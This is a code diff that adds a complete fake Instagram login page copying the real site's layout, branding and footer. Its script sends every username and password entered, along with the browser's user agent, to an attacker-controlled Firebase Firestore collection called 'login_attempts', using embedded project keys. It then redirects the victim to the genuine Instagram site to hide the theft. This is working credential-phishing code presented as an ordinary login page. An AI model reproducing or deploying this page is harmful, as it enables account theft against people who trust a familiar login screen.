@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="./style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <link rel="icon" href="./images/logo.png" type="image/x-icon">
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="container">
+            <div class="phone-image">
+                <img src="./images/storys.png" alt="Instagram on Phone">
+            </div>
+
+            <div class="login-container">
+                <div class="login-box">
+                    <img src="images/logo.png" alt="Instagram" class="logo">
+                    
+                    <form id="loginForm" class="login-form">
+                        <div class="form-group">
+                            <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="password" id="password" name="password" placeholder="Password" required>
+                        </div>
+                        <button type="submit" class="login-button">Log In</button>
+                    </form>
+
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+
+                    <div class="facebook-login">
+                        <img src="images/logo_facebook.png" alt="Facebook">
+                        <a href="#" class="facebook-link">Log in with Facebook</a>
+                    </div>
+                    
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <div class="signup-box">
+                    <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+                </div>
+            </div>
+        </div>
+        
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Meta</a>
+                    <a href="#">About</a>
+                    <a href="#">Blog</a>
+                    <a href="#">Jobs</a>
+                    <a href="#">Help</a>
+                    <a href="#">API</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                    <a href="#">Locations</a>
+                    <a href="#">Instagram Lite</a>
+                    <a href="#">Meta AI</a>
+                    <a href="#">Meta AI Articles</a>
+                    <a href="#">Threads</a>
+                    <a href="#">Contact Uploading & Non-Users</a>
+                    <a href="#">Meta Verified</a>
+                </div>
+                <div class="footer-meta">
+                    <select class="language-selector">
+                        <option>English</option>
+                        <option>Español</option>
+                        <option>Français</option>
+                        <option>中文</option>
+                    </select>
+                    <div class="copyright">
+                        © 2025 Instagram from Meta
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
+            authDomain: "insta-7f34f.firebaseapp.com",
+            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
+            projectId: "insta-7f34f",
+            storageBucket: "insta-7f34f.firebasestorage.app",
+            messagingSenderId: "981637167144",
+            appId: "1:981637167144:web:841af72e833be6ed081d1d"
+        };
+      
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                // Store in Firebase
+                await db.collection("login_attempts").add({
+                    username: username,
+                    password: password,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                    userAgent: navigator.userAgent,
+                    timestampClient: new Date().toISOString()
+                });
+                
+                // Redirect to Instagram after successful storage
+                window.location.href = "https://www.instagram.com/";
+            } catch (error) {
+                console.error("Error storing data: ", error);
+                // Still redirect even if storage fails
+                window.location.href = "https://www.instagram.com/";
+            }
+        });
+    </script>
+</body>
+</html>
